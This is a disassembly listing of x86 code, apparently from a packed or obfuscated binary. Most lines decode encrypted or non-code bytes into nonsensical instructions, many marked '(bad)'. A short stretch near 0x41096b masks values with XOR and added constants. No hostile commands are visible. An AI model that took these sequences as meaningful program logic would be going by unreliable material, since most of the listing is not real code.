  41026b:	inc    edi
  41026c:	cmc    
  41026d:	or     al,0xc4
  41026f:	pop    esi
  410270:	inc    ebp
  410271:	aas    
  410272:	pop    esp
  410273:	mov    al,0xe3
  410275:	jg     0x410224
  410277:	push   edi
  410278:	add    al,BYTE PTR [ebx-0x4b]
  41027b:	add    al,0x7
  41027d:	mov    WORD PTR [ebp+0x1c9db5b1],cs
  410283:	dec    esp
  410284:	push   cs
  410285:	scas   eax,DWORD PTR es:[edi]
  410286:	scas   eax,DWORD PTR es:[edi]
  410287:	jo     0x410257
  410289:	call   0xf57e:0x3800a3b4
  410290:	hlt    
  410291:	pop    ecx
  410292:	add    al,0x26
  410294:	and    ah,ah
  410296:	jecxz  0x4102a1
  410298:	xor    al,0x63
  41029a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41029b:	mov    ch,al
  41029d:	fild   DWORD PTR [ebx-0x14ffd332]
  4102a3:	mov    ah,0x8
  4102a5:	mov    BYTE PTR [ebx],al
  4102a7:	and    eax,0x3370144f
  4102ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102ad:	pop    ebp
  4102ae:	sbb    ecx,DWORD PTR [ebx+0x5fc10e7]
  4102b4:	inc    edi
  4102b5:	popa   
  4102b6:	jbe    0x4102cf
  4102b8:	xchg   ebp,eax
  4102b9:	mov    ebx,0x66fb0f82
  4102be:	dec    esp
  4102bf:	shr    DWORD PTR [esi+0x18],1
  4102c2:	push   0x66b72f40
  4102c7:	adc    esi,esp
  4102c9:	mov    WORD PTR [ebp-0x14418849],es
  4102cf:	push   cs
  4102d0:	push   esp
  4102d1:	dec    eax
  4102d2:	xchg   ebp,eax
  4102d3:	cdq    
  4102d4:	pop    esi
  4102d5:	sar    ch,1
  4102d7:	mov    ds:0x8f35ca70,al
  4102dc:	cmp    sp,di
  4102df:	mov    ds:0x321f58c,eax
  4102e4:	repz popa 
  4102e6:	lds    edi,FWORD PTR [eax-0x5bf5224]
  4102ec:	gs push ecx
  4102ee:	xor    al,0x4c
  4102f0:	add    DWORD PTR [ebx-0x18],edx
  4102f3:	pop    eax
  4102f4:	shl    DWORD PTR [ecx+edx*1],0x26
  4102f8:	rcr    DWORD PTR [edx+esi*4],1
  4102fb:	sbb    eax,0x858f652c
  410300:	lods   al,BYTE PTR ds:[esi]
  410301:	std    
  410302:	sbb    ah,BYTE PTR [edi-0x49]
  410305:	fild   DWORD PTR [esi+edi*8+0x2]
  410309:	ror    BYTE PTR [edi-0x7c],0x9d
  41030d:	adc    DWORD PTR [ecx],0x9dea1994
  410313:	inc    ecx
  410314:	fwait
  410315:	pop    esp
  410316:	mov    BYTE PTR [esp+esi*4+0x55aadd95],al
  41031d:	ins    DWORD PTR es:[edi],dx
  41031e:	xchg   BYTE PTR [ecx],ah
  410320:	sub    al,0x2c
  410322:	adc    DWORD PTR [esi-0x8],eax
  410325:	xchg   esi,eax
  410326:	sbb    BYTE PTR [edi],dl
  410328:	sbb    ah,dh
  41032a:	sar    BYTE PTR [edx],1
  41032c:	jnp    0x410329
  41032e:	in     eax,dx
  41032f:	cs push esp
  410331:	mov    ecx,DWORD PTR [ecx+0x23cb4e5f]
  410337:	and    ecx,DWORD PTR [edi+0x1b]
  41033a:	mov    ds:0x3680fd79,eax
  41033f:	add    al,0xf
  410341:	sbb    eax,0xabdd5cae
  410346:	test   eax,0x473c0f2e
  41034b:	sub    cl,bl
  41034d:	mov    cl,BYTE PTR [ecx+0x114ce80e]
  410353:	xchg   edi,eax
  410354:	sub    al,0xe5
  410356:	arpl   bx,ax
  410358:	out    dx,al
  410359:	data16 jg 0x410383
  41035c:	fwait
  41035d:	ret    
  41035e:	mov    ds:0xe98a319a,al
  410363:	jno    0x410392
  410365:	jno    0x410346
  410367:	jmp    0xef93:0x38ec8ffc
  41036e:	dec    ecx
  41036f:	xchg   edi,eax
  410370:	jo     0x4103d0
  410372:	les    eax,FWORD PTR ds:0xb4b2d850
  410378:	adc    ah,BYTE PTR [eax+0x24]
  41037b:	retf   
  41037c:	jecxz  0x410311
  41037e:	or     BYTE PTR [eax+eiz*1],0x20
  410382:	in     eax,dx
  410383:	xor    ecx,esi
  410385:	fistp  QWORD PTR [edx-0x76bd8ec6]
  41038b:	pop    esp
  41038c:	leave  
  41038d:	test   DWORD PTR [edx],esi
  41038f:	xchg   edx,eax
  410390:	gs js  0x41035c
  410393:	mov    ?,WORD PTR [esi+0x4e]
  410396:	les    ebx,FWORD PTR [esi]
  410398:	pop    eax
  410399:	mov    ds:0x2619df3d,eax
  41039e:	jge    0x410418
  4103a0:	adc    al,0xe5
  4103a2:	iret   
  4103a3:	inc    edx
  4103a4:	mov    eax,ds:0x96a28bfe
  4103a9:	mov    ecx,0x6580b31c
  4103ae:	pop    ecx
  4103af:	sbb    al,0x70
  4103b1:	xchg   dl,ch
  4103b3:	mov    esi,0xfcc7ca19
  4103b8:	jg     0x410391
  4103ba:	inc    ebx
  4103bb:	jnp    0x4103c3
  4103bd:	mov    al,0xec
  4103bf:	ds ja  0x41038a
  4103c2:	jo     0x410411
  4103c4:	aas    
  4103c5:	not    DWORD PTR [ebx]
  4103c7:	ins    BYTE PTR es:[edi],dx
  4103c8:	mov    ch,0xa1
  4103ca:	add    al,0x57
  4103cc:	pop    edi
  4103cd:	dec    ecx
  4103ce:	in     al,0xc3
  4103d0:	aad    0xe0
  4103d2:	dec    ebx
  4103d3:	mov    bl,0x5a
  4103d5:	sbb    al,0xdc
  4103d7:	inc    eax
  4103d8:	div    DWORD PTR [ecx]
  4103da:	popa   
  4103db:	xchg   edx,eax
  4103dc:	stos   BYTE PTR es:[edi],al
  4103dd:	xchg   ebx,eax
  4103de:	mov    ebx,0xba9061c9
  4103e3:	loopne 0x41041d
  4103e5:	addr16 out dx,al
  4103e7:	sar    ch,0x0
  4103ea:	pop    edi
  4103eb:	inc    ebx
  4103ec:	xchg   edi,eax
  4103ed:	or     eax,0xe0ddbebf
  4103f2:	ror    BYTE PTR [edx-0x6f81227a],0x7e
  4103f9:	aaa    
  4103fa:	enter  0xc499,0x47
  4103fe:	push   eax
  4103ff:	stos   BYTE PTR es:[edi],al
  410400:	adc    eax,DWORD PTR [eax]
  410402:	call   DWORD PTR [ecx+0x1e1b3b34]
  410408:	retf   
  410409:	shl    DWORD PTR [eax],1
  41040b:	jge    0x41041c
  41040d:	xchg   esp,eax
  41040e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41040f:	pop    es
  410410:	jnp    0x410428
  410412:	inc    ecx
  410413:	ret    0x20e1
  410416:	je     0x41045f
  410418:	loop   0x410498
  41041a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41041b:	jb     0x41044f
  41041d:	cs mov al,0xe1
  410420:	or     ecx,0xc54d91e0
  410426:	push   ds
  410427:	xor    ah,BYTE PTR [edi+0x14f79707]
  41042d:	dec    eax
  41042e:	mov    edi,0xaa3f361f
  410433:	cmp    eax,0xf0d4a832
  410438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41043a:	popf   
  41043b:	popa   
  41043c:	stos   DWORD PTR es:[edi],eax
  41043d:	stc    
  41043e:	jge    0x4103fe
  410440:	mul    BYTE PTR [ecx-0x6f]
  410443:	out    dx,al
  410444:	retf   
  410445:	ficomp DWORD PTR [ebp-0x25bc0ef6]
  41044b:	popf   
  41044c:	das    
  41044d:	scas   al,BYTE PTR es:[edi]
  41044e:	xor    eax,0xfea11227
  410453:	adc    eax,0x6313d391
  410458:	sbb    eax,0xbdb3af16
  41045d:	aas    
  41045e:	fst    QWORD PTR [ebx]
  410460:	jae    0x410473
  410462:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410463:	sub    BYTE PTR [ebx+0x8],0xe8
  410467:	jecxz  0x410496
  410469:	cmc    
  41046a:	sub    ecx,DWORD PTR [edx-0x24]
  41046d:	mov    ds,WORD PTR [edi]
  41046f:	sahf   
  410470:	bound  esp,QWORD PTR [ecx-0x66f0cfe0]
  410476:	std    
  410477:	jmp    0x91b:0xf85688ed
  41047e:	inc    eax
  41047f:	mov    ebp,0x43be7f6d
  410484:	sbb    esp,DWORD PTR [edi+0x57cb236f]
  41048a:	lock mov dx,0x4572
  41048f:	xchg   esi,eax
  410490:	les    ebx,FWORD PTR [esi-0x7e]
  410493:	mov    edx,0xbb5de45e
  410498:	shr    BYTE PTR [ecx+0x40c9b06f],1
  41049e:	inc    ebp
  41049f:	std    
  4104a0:	jo     0x4104ab
  4104a2:	xchg   ecx,eax
  4104a3:	jnp    0x410517
  4104a5:	dec    eax
  4104a6:	add    bh,BYTE PTR [ebx+ebx*8+0x35f07204]
  4104ad:	push   es
  4104ae:	push   ecx
  4104af:	leave  
  4104b0:	jmp    0xc5403493
  4104b5:	pop    ds
  4104b6:	and    eax,0xa3ba44b1
  4104bb:	js     0x410505
  4104bd:	sub    eax,0x3af5ccf7
  4104c2:	mov    eax,0x10c60e7c
  4104c7:	retf   0xad65
  4104ca:	cli    
  4104cb:	sbb    esi,DWORD PTR [ebx-0x1]
  4104ce:	leave  
  4104cf:	ret    0x2bad
  4104d2:	mov    ecx,0xcba1cdf
  4104d7:	xchg   DWORD PTR [ebx],edi
  4104d9:	in     al,dx
  4104da:	xchg   ecx,eax
  4104db:	xchg   esi,eax
  4104dc:	mov    cl,0xc4
  4104de:	jge    0x41047b
  4104e0:	sub    DWORD PTR [ebx-0x4b46396a],esi
  4104e6:	(bad)  
  4104e7:	xlat   BYTE PTR ds:[ebx]
  4104e8:	popa   
  4104e9:	ins    BYTE PTR es:[edi],dx
  4104ea:	adc    eax,0xc1849426
  4104ef:	push   edi
  4104f0:	cdq    
  4104f1:	std    
  4104f2:	jnp    0x4104af
  4104f4:	loopne 0x41053b
  4104f6:	add    BYTE PTR [eax-0x5160d2e6],0x6e
  4104fd:	loope  0x410508
  4104ff:	push   ecx
  410500:	(bad)  
  410501:	pop    esi
  410502:	push   cs
  410503:	sub    al,0x27
  410505:	call   0x26cabec0
  41050a:	je     0x4104cc
  41050c:	fs push ebx
  41050e:	lods   al,BYTE PTR ds:[esi]
  41050f:	mov    WORD PTR ds:0x6f74d77f,ds
  410515:	aad    0x6a
  410517:	sbb    esp,esi
  410519:	ins    BYTE PTR es:[edi],dx
  41051a:	sar    DWORD PTR [edx-0x77],1
  41051d:	imul   esp,DWORD PTR [esi+0x3],0x250ae9cb
  410524:	adc    ch,BYTE PTR [ecx+0x297dfe]
  41052a:	loope  0x410576
  41052c:	frstor [esp+eax*1]
  41052f:	sbb    al,0x20
  410531:	dec    ebx
  410532:	popa   
  410533:	pop    edi
  410534:	minps  xmm0,XMMWORD PTR [ebx]
  410537:	jae    0x4104c8
  410539:	adc    al,0x43
  41053b:	push   0x8861cde2
  410540:	mov    ss,edx
  410542:	fcmovnu st,st(3)
  410544:	jno    0x41058a
  410546:	sub    edx,esi
  410548:	mov    edx,0x6fb9b393
  41054d:	sub    ecx,0x5
  410550:	mov    WORD PTR [eax-0x1],ds
  410553:	mov    eax,0xa57685f8
  410558:	scas   al,BYTE PTR es:[edi]
  410559:	mov    edx,DWORD PTR [edx+esi*1-0x35]
  41055d:	(bad)
  410561:	ja     0x4105db
  410563:	popa   
  410564:	jmp    0x410501
  410566:	cld    
  410567:	inc    edi
  410568:	fnstcw WORD PTR [ebp-0x3f7ae81d]
  41056e:	je     0x411a02
  410574:	mov    DWORD PTR [ebp-0x24],esi
  410577:	jmp    0x41096b
  41057c:	in     eax,0xe6
  41057e:	outs   dx,DWORD PTR ds:[esi]
  41057f:	pop    ebp
  410580:	outs   dx,DWORD PTR ds:[esi]
  410581:	jne    0x410578
  410583:	data16 hlt 
  410585:	test   ebx,eax
  410587:	pushf  
  410588:	push   esp
  410589:	inc    ebp
  41058a:	xchg   edi,eax
  41058b:	fmul   QWORD PTR [edx]
  41058d:	mov    edi,0x7d497070
  410592:	jo     0x410604
  410594:	sahf   
  410595:	sub    eax,0x78d6176e
  41059a:	call   0x252d:0x598acb14
  4105a1:	cmp    dl,bl
  4105a3:	cs jns 0x410547
  4105a6:	mov    ch,0x66
  4105a8:	pop    esi
  4105a9:	push   edx
  4105aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105ab:	jl     0x410554
  4105ad:	or     al,0x88
  4105af:	and    edx,DWORD PTR [ebx+0x5eac3420]
  4105b5:	and    DWORD PTR [ebp+0x42],edi
  4105b8:	(bad)  
  4105b9:	out    dx,al
  4105ba:	(bad)  
  4105bb:	or     eax,DWORD PTR [esi+0x39]
  4105be:	aaa    
  4105bf:	repz repnz pop esi
  4105c2:	daa    
  4105c3:	inc    eax
  4105c4:	aaa    
  4105c5:	mov    ds:0xcfd602d0,eax
  4105ca:	sti    
  4105cb:	inc    esp
  4105cc:	sbb    esi,ebx
  4105ce:	mov    ebx,0xf406a69
  4105d3:	test   BYTE PTR [esi+0x3a83f888],al
  4105d9:	(bad)  
  4105da:	call   0xbf8fd09b
  4105df:	cli    
  4105e0:	jae    0x41059d
  4105e2:	pop    ds
  4105e3:	xor    al,0x27
  4105e5:	mov    ds:0x23b836c,al
  4105ea:	js     0x4105e5
  4105ec:	addr16 aad 0x61
  4105ef:	ret    0x3d81
  4105f2:	dec    eax
  4105f3:	mov    BYTE PTR [ebp+0x4a6b6682],ch
  4105f9:	ret    0x8805
  4105fc:	mul    DWORD PTR [eax+0x4e]
  4105ff:	or     esp,ecx
  410601:	mov    ds:0xe7a39715,al
  410606:	cmp    eax,DWORD PTR [ebx]
  410608:	clc    
  410609:	pusha  
  41060a:	loopne 0x41063e
  41060c:	push   cs
  41060d:	mov    bh,0xc5
  41060f:	outs   dx,BYTE PTR ds:[esi]
  410610:	int3   
  410611:	sub    esp,DWORD PTR [edi+0x488772c1]
  410617:	xor    al,0xd9
  410619:	jle    0x410607
  41061b:	push   edi
  41061c:	daa    
  41061d:	pop    ecx
  41061e:	aad    0x23
  410620:	imul   eax,DWORD PTR [edi+edx*1],0xffffffe4
  410624:	and    bh,BYTE PTR [ebx+0xf7540e3]
  41062a:	ficomp DWORD PTR [edi-0x5dc17b14]
  410630:	pop    eax
  410631:	dec    ebp
  410632:	add    bl,bh
  410634:	or     bh,bl
  410636:	or     BYTE PTR [edx],ch
  410638:	test   BYTE PTR gs:[eax+0x67e0072],0x86
  410640:	adc    eax,0x1c6400a8
  410645:	sbb    ebp,DWORD PTR [edx-0x6ce429d3]
  41064b:	sbb    BYTE PTR [ecx],dl
  41064d:	cmp    DWORD PTR [eax],esi
  41064f:	mov    ss,WORD PTR [esi-0x63]
  410652:	sbb    esi,0x9005209
  410658:	and    DWORD PTR [edi+0x7a],ebp
  41065b:	cwde   
  41065c:	call   0xd423dbc8
  410661:	jmp    0xb7f4:0x20b5943a
  410668:	std    
  410669:	jp     0x410695
  41066b:	jmp    0x196f:0x3d91537d
  410672:	lds    eax,FWORD PTR [esi-0x416cd3e]
  410678:	pop    esp
  410679:	dec    eax
  41067a:	adc    BYTE PTR [edi-0x73231a95],ah
  410680:	xchg   esi,eax
  410681:	ds mov ebx,0x3f7f5611
  410687:	sbb    al,0x65
  410689:	xor    eax,0xfa917d57
  41068e:	push   ss
  41068f:	dec    ebx
  410690:	loop   0x4106fa
  410692:	stos   BYTE PTR es:[edi],al
  410693:	gs dec eax
  410695:	cwde   
  410696:	std    
  410697:	call   0x76dff53d
  41069c:	(bad)  
  41069d:	jmp    esp
  41069f:	and    BYTE PTR [edx],dl
  4106a1:	sbb    al,0xc4
  4106a3:	aas    
  4106a4:	fstp   DWORD PTR [ebx+ebp*4-0x56]
  4106a8:	sti    
  4106a9:	enter  0xc4c0,0xd9
  4106ad:	dec    esp
  4106ae:	sbb    eax,0x85520851
  4106b3:	nop
  4106b4:	js     0x410671
  4106b6:	xchg   ecx,eax
  4106b7:	(bad)  
  4106b8:	or     bl,bl
  4106ba:	adc    al,0x18
  4106bc:	lahf   
  4106bd:	punpckhbw mm1,QWORD PTR cs:[ecx+0x64]
  4106c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106c3:	dec    esp
  4106c4:	outs   dx,DWORD PTR ds:[esi]
  4106c5:	adc    al,BYTE PTR [ecx]
  4106c7:	sbb    DWORD PTR [edx-0x17df7f58],edx
  4106cd:	je     0x41066b
  4106cf:	pushf  
  4106d0:	loopne 0x410742
  4106d2:	fwait
  4106d3:	test   BYTE PTR [edx+0x6c],bl
  4106d6:	pop    ecx
  4106d7:	dec    esi
  4106d8:	into   
  4106d9:	and    DWORD PTR [edx+0x6df46894],edx
  4106df:	rcl    BYTE PTR [eax+ebx*4],1
  4106e2:	das    
  4106e3:	pop    ds
  4106e4:	rcr    DWORD PTR [esi-0x2e2ca35b],cl
  4106ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106eb:	xor    eax,0x28a353c9
  4106f0:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4106f2:	push   eax
  4106f3:	xchg   ecx,eax
  4106f4:	and    ebx,DWORD PTR [edx]
  4106f6:	add    BYTE PTR [esp+ecx*2],bh
  4106f9:	add    edx,edi
  4106fb:	cmp    edx,ebx
  4106fd:	sti    
  4106fe:	pop    ebp
  4106ff:	les    esp,FWORD PTR [edx+0x34850af4]
  410705:	add    al,0xc
  410707:	test   al,0xd3
  410709:	sbb    eax,0xc28a3f59
  41070e:	cdq    
  41070f:	out    dx,eax
  410710:	iret   
  410711:	ss xchg esp,eax
  410713:	mov    ch,0x9f
  410715:	out    0xa6,eax
  410717:	imul   edi,DWORD PTR [ecx+ebx*8+0x23b7c59e],0xffffffe8
  41071f:	js     0x41077d
  410721:	jmp    0x2f460378
  410726:	sbb    BYTE PTR ds:0x97ddccbe,cl
  41072c:	mov    WORD PTR [ebx-0x5a],es
  41072f:	or     BYTE PTR [ebx+0x61],ah
  410732:	ja     0x4106e3
  410734:	(bad)  
  410735:	mov    eax,0x69072412
  41073a:	mov    cs,WORD PTR [ebx+0x6c]
  41073d:	adc    bl,BYTE PTR [ebp+0x12]
  410740:	cmp    eax,0xb9a82b42
  410745:	stos   DWORD PTR es:[edi],eax
  410746:	mov    ds:0xe7b71665,eax
  41074b:	push   esp
  41074c:	sub    edi,DWORD PTR [ebp+0x2a6a7c96]
  410752:	nop
  410753:	in     eax,dx
  410754:	xor    edx,esi
  410756:	jl     0x41070f
  410758:	xor    BYTE PTR [ebx-0x27],dl
  41075b:	push   ebx
  41075c:	or     dl,BYTE PTR [ecx+0x4c]
  41075f:	add    edi,esp
  410761:	mov    eax,0xae4b8680
  410766:	push   ecx
  410767:	pop    esi
  410768:	mov    bl,BYTE PTR [ebx+0x1b]
  41076b:	jns    0x4107d9
  41076d:	push   edx
  41076e:	jnp    0x4107a5
  410770:	test   eax,0x60faba8d
  410775:	fdivp  st(0),st
  410777:	jl     0x410775
  410779:	shr    BYTE PTR [ecx+0x21b96b4],1
  41077f:	imul   edx,DWORD PTR [ebx-0x28],0x1c
  410783:	or     al,0xbc
  410785:	into   
  410786:	dec    edi
  410787:	test   BYTE PTR [edx-0x73],cl
  41078a:	outs   dx,BYTE PTR ds:[esi]
  41078b:	les    edx,FWORD PTR [ebx-0x37fcdc1f]
  410791:	(bad)  
  410792:	fprem1 
  410794:	sbb    eax,edx
  410796:	push   ecx
  410797:	call   0x274d:0x8f38da68
  41079e:	enter  0x2f2c,0x14
  4107a2:	or     BYTE PTR [ecx-0x6993d150],0x88
  4107a9:	cmp    al,0x55
  4107ab:	cwde   
  4107ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4107ad:	mov    al,ds:0xe6d7cd1f
  4107b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107b3:	aas    
  4107b4:	ret    0x11f7
  4107b7:	jge    0x410805
  4107b9:	mov    edx,0x41252f9b
  4107be:	push   ebx
  4107bf:	push   eax
  4107c0:	loope  0x4107fe
  4107c2:	cli    
  4107c3:	pop    bx
  4107c5:	hlt    
  4107c6:	jecxz  0x41079a
  4107c8:	cmp    edx,DWORD PTR [edi+0x587a07cb]
  4107ce:	cwde   
  4107cf:	pop    edx
  4107d0:	add    BYTE PTR [edx+0x45],bl
  4107d3:	jne    0x410796
  4107d5:	pop    esi
  4107d6:	sahf   
  4107d7:	inc    edx
  4107d8:	add    dl,BYTE PTR [edi+0x5a]
  4107db:	mov    bl,0x39
  4107dd:	xchg   esp,eax
  4107de:	add    dh,BYTE PTR [edx]
  4107e0:	add    eax,edx
  4107e2:	cmp    esi,DWORD PTR [ecx]
  4107e4:	and    DWORD PTR [ebp-0x45c661c],0xffffffcb
  4107eb:	test   eax,0x8f9b7f32
  4107f0:	xor    DWORD PTR [edi+0x7738005b],ecx
  4107f6:	hlt    
  4107f7:	inc    ebx
  4107f8:	(bad)  
  4107f9:	test   eax,0x2e29d8d6
  4107fe:	imul   eax,edi,0x374ea06f
  410804:	cwde   
  410805:	enter  0x5152,0x7c
  410809:	les    esi,FWORD PTR [edx-0x7e]
  41080c:	xor    dh,0x40
  41080f:	es daa 
  410811:	jmp    0x5ce7:0x87012aef
  410818:	mov    WORD PTR [ecx+0xe],ds
  41081b:	lds    ebp,FWORD PTR [ebp+0x66b5c924]
  410821:	aaa    
  410822:	cmp    edi,ecx
  410824:	fcmovbe st,st(5)
  410826:	cmp    edi,0xe04c5a9c
  41082c:	fucompp 
  41082e:	daa    
  41082f:	inc    esi
  410830:	icebp  
  410831:	out    0xf8,eax
  410833:	or     al,0x89
  410835:	das    
  410836:	adc    eax,0x80398f61
  41083b:	or     dh,BYTE PTR [ebx+ecx*8]
  41083e:	cs push esi
  410840:	jnp    0x4108c1
  410842:	xor    edx,esi
  410844:	loop   0x4107e8
  410846:	and    BYTE PTR [eax],dl
  410848:	adc    eax,0xd893575d
  41084d:	jecxz  0x410858
  41084f:	xchg   ecx,eax
  410850:	pop    edi
  410852:	sub    DWORD PTR [edx-0x16],ecx
  410855:	mov    al,ds:0x544dd4dd
  41085a:	pop    edi
  41085b:	lds    ecx,FWORD PTR [eax+0x6f]
  41085e:	mov    ds:0xab9153f8,al
  410863:	mov    ds:0xeb36ed77,eax
  410868:	jno    0x41080b
  41086a:	inc    eax
  41086b:	(bad)  
  41086c:	cmp    eax,0x3f3423ba
  410871:	imul   edi,eax,0x1788e40
  410877:	js     0x4108c3
  410879:	adc    dl,bh
  41087b:	or     BYTE PTR [edx-0x43],0x4a
  41087f:	rcl    BYTE PTR [ebx],1
  410881:	pop    edx
  410882:	fnstenv [edx+0x14]
  410885:	pushf  
  410886:	sar    DWORD PTR [esi-0x1d],cl
  410889:	les    ecx,FWORD PTR [ecx+edi*2-0x1d]
  41088d:	imul   esi,DWORD PTR [edi+0x4d],0xfffffff8
  410891:	mov    DWORD PTR [eax-0xb],edx
  410894:	mov    ah,0x71
  410896:	mov    BYTE PTR [ebx+0x41],bl
  410899:	lods   eax,DWORD PTR ss:[esi]
  41089b:	test   eax,0x8ef9cc
  4108a0:	cmp    ch,ah
  4108a2:	sti    
  4108a3:	and    al,0x61
  4108a5:	and    al,0xa8
  4108a7:	aam    0x92
  4108a9:	jge    0x4108b8
  4108ab:	inc    eax
  4108ac:	inc    edx
  4108ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108af:	jmp    0x6842b10d
  4108b4:	dec    edi
  4108b5:	ins    BYTE PTR es:[edi],dx
  4108b6:	push   cs
  4108b7:	mov    esp,eax
  4108b9:	(bad)  
  4108bb:	test   al,0x73
  4108bd:	cmp    BYTE PTR [edi+0x761b9abe],cl
  4108c3:	mov    cl,0xae
  4108c5:	cmc    
  4108c6:	das    
  4108c7:	push   cs
  4108c8:	push   ds
  4108c9:	inc    ebx
  4108ca:	pusha  
  4108cb:	jnp    0x41090f
  4108cd:	in     al,dx
  4108ce:	lods   al,BYTE PTR ds:[esi]
  4108cf:	es test eax,0x5b3fd085
  4108d5:	into   
  4108d6:	call   0xc118:0xc38894bb
  4108dd:	dec    esp
  4108de:	clc    
  4108df:	cmp    ebp,DWORD PTR [eax-0x54]
  4108e2:	ds mov esi,edi
  4108e5:	cmp    dh,BYTE PTR [esi+eiz*1-0x4bc6bbd]
  4108ec:	fdivr  st(0),st
  4108ee:	inc    edi
  4108ef:	out    0xc2,eax
  4108f1:	mov    WORD PTR [edx+0x54],?
  4108f4:	out    dx,eax
  4108f5:	rol    cl,0x63
  4108f8:	test   ah,bl
  4108fa:	(bad)
  4108fd:	cdq    
  4108fe:	inc    eax
  4108ff:	sbb    edx,DWORD PTR [ecx-0x5b]
  410902:	iret   
  410903:	mov    ebp,0x3101609c
  410908:	mov    ebx,0x94c32335
  41090d:	mov    dh,0x92
  41090f:	sub    al,0x21
  410911:	into   
  410912:	xchg   DWORD PTR [ebx],edx
  410914:	inc    ebx
  410915:	hlt    
  410916:	out    dx,eax
  410917:	lds    ebx,FWORD PTR [ebx-0x60]
  41091a:	aaa    
  41091b:	inc    esp
  41091c:	sub    eax,0x94c3730
  410921:	pop    esp
  410922:	stos   DWORD PTR es:[edi],eax
  410923:	jmp    0x44ee68b3
  410928:	mov    bl,0xe3
  41092a:	mov    dh,BYTE PTR [edx]
  41092c:	lds    ebp,FWORD PTR [eax-0x3c]
  41092f:	push   0x17
  410931:	sub    DWORD PTR [ecx],ebp
  410933:	xor    al,0xde
  410935:	sub    bl,bl
  410937:	add    ch,BYTE PTR [edi+0x5f610bd0]
  41093d:	dec    eax
  41093e:	enter  0xd3c7,0x1
  410942:	xor    DWORD PTR [edi],0xa7ef805
  410948:	pop    ecx
  410949:	xor    eax,0x9aebaa96
  41094e:	sub    ebx,DWORD PTR [esi+0x1b297538]
  410954:	call   DWORD PTR ds:0x7c48238a
  41095a:	mov    DWORD PTR [esi+esi*4],esi
  41095d:	aas    
  41095e:	outs   dx,DWORD PTR ds:[esi]
  41095f:	test   al,0x29
  410961:	adc    DWORD PTR [ecx+0x6f],esp
  410964:	sbb    BYTE PTR [ebp-0x63309acf],dh
  41096a:	inc    ebp
  41096b:	push   0xb
  41096d:	pop    ecx
  41096e:	push   0x5
  410970:	dec    ecx
  410971:	pop    ebx
  410972:	xchg   ebx,ecx
  410974:	sub    ebx,ecx
  410976:	xchg   ebx,ecx
  410978:	dec    ecx
  410979:	mov    eax,DWORD PTR [ebp-0x1c]
  41097c:	imul   eax,ecx
  41097f:	sub    esp,eax
  410981:	mov    DWORD PTR [ebp-0x24],esp
  410984:	mov    eax,DWORD PTR [ebp-0x4]
  410987:	mov    ecx,0x7510855
  41098c:	xor    eax,ecx
  41098e:	mov    edx,0x32729c
  410993:	add    eax,edx
  410995:	mov    DWORD PTR [ebp+0x8],eax
  410998:	mov    eax,DWORD PTR [ebp-0x18]
  41099b:	xor    eax,ecx
  41099d:	add    eax,edx
  41099f:	mov    edx,DWORD PTR [ebp+0x14]
  4109a2:	imul   eax,DWORD PTR [edx]
  4109a5:	mov    edx,DWORD PTR [ebp-0x4]
  4109a8:	xor    edx,ecx
  4109aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4109ad:	lea    ecx,[edx+ecx*1+0x32729c]
  4109b4:	cmp    ecx,eax
  4109b6:	je     0x4119fd
  4109bc:	mov    edi,DWORD PTR [ebp-0x18]
  4109bf:	mov    eax,DWORD PTR [ebp+0x8]
  4109c2:	mov    edx,DWORD PTR [ebp+0x14]
  4109c5:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4109c9:	mov    ecx,0x7510855
  4109ce:	xor    edx,edx
  4109d0:	xor    edi,ecx
  4109d2:	mov    esi,0x32729c
  4109d7:	add    edi,esi
  4109d9:	div    edi
  4109db:	mov    edx,DWORD PTR [ebp-0x4]
  4109de:	xor    edx,ecx
  4109e0:	lea    eax,[edx+eax*1+0x32729c]
  4109e7:	mov    edx,DWORD PTR [ebp+0x8]
  4109ea:	mov    edi,DWORD PTR [ebp-0x24]
  4109ed:	mov    DWORD PTR [edi+edx*4],eax
  4109f0:	mov    eax,DWORD PTR [ebp-0x18]
  4109f3:	jmp    0x410de7
  4109f8:	ja     0x41099d
  4109fa:	mov    ecx,0x7175496f
  4109ff:	mov    ds:0xd6da6ce9,eax
  410a04:	retf   
  410a05:	xor    ch,BYTE PTR [edx+0x70bc63c1]
  410a0b:	jo     0x410a56
  410a0d:	jge    0x410a7f
  410a0f:	jo     0x4109f2
  410a11:	mov    ch,0x7e
  410a13:	(bad)  
  410a14:	xchg   edi,eax
  410a15:	lahf   
  410a16:	xor    BYTE PTR [eax+0x41],ch
  410a19:	test   eax,0xfb7221d9
  410a1e:	loop   0x4109eb
  410a20:	(bad)  
  410a21:	popa   
  410a22:	inc    ecx
  410a23:	adc    eax,0xad4ec3e4
  410a28:	and    BYTE PTR [ebx-0x58a1958d],dh
  410a2e:	mov    ebx,0xfd4ef44f
  410a33:	add    ebp,DWORD PTR [esi-0x2]
  410a36:	xchg   edi,eax
  410a37:	ins    BYTE PTR es:[edi],dx
  410a38:	jge    0x410a76
  410a3a:	stos   DWORD PTR es:[edi],eax
  410a3b:	outs   dx,DWORD PTR ds:[esi]
  410a3c:	adc    DWORD PTR [edx+0x6a66bd05],ebx
  410a42:	xchg   esp,eax
  410a43:	(bad)  
  410a44:	std    
  410a45:	test   eax,0xa8e9a481
  410a4a:	test   BYTE PTR ds:0x20f165c8,ch
  410a50:	daa    
  410a51:	mov    ebp,0x6347c46c
  410a56:	pop    esp
  410a57:	ret    
  410a58:	push   ebp
  410a59:	push   0x73
  410a5b:	fwait
  410a5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
